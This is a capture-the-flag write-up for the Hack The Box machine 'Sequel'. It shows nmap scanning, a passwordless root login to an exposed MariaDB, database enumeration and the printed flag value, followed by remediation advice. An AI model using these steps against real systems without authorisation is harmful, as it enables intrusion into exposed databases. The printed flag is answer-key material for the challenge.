# HTB - Sequel

**Platform:** Hack The Box — Starting Point, Tier 1  
**OS:** Linux  
**Difficulty:** Very Easy  
**Status:** Pwned ✅

---

## Summary

Sequel is a Linux machine running a MariaDB instance accessible from the network with no password on the root account. Once connected, it's just a matter of browsing the databases to find the flag.

---

## Tools Used

- `nmap` — port scanning
- `mysql` — MySQL/MariaDB client

---

## Steps

### 1. Port Scanning

```bash
nmap -sV 10.129.50.68
```

Result:

```
PORT     STATE SERVICE
3306/tcp open  mysql
```

MySQL/MariaDB is exposed on port 3306.

### 2. Connecting to MariaDB

```bash
mysql -h 10.129.50.68 -u root --skip-ssl
```

Connected as root with no password required.

### 3. Enumerating Databases

```sql
SHOW DATABASES;
```

Found a non-default database: `htb`.

```sql
USE htb;
SHOW TABLES;
```

Two tables: `config` and `users`.

### 4. Finding the Flag

```sql
SELECT * FROM config;
```

The flag was stored directly in the config table.

```
7b4bec00d1a39e3dd4e021ec3d915da8
```

---

## What I Learned

- MySQL/MariaDB runs on port 3306 by default
- Root accounts with no password are a critical misconfiguration
- Sensitive data like flags, credentials, and config values are often stored directly in database tables
- Always enumerate all databases and tables when you get DB access

---

## Remediation

- Always set a strong password on the root database account
- Never expose MySQL/MariaDB directly on the network — bind to localhost only
- Use a firewall to block port 3306 from external access
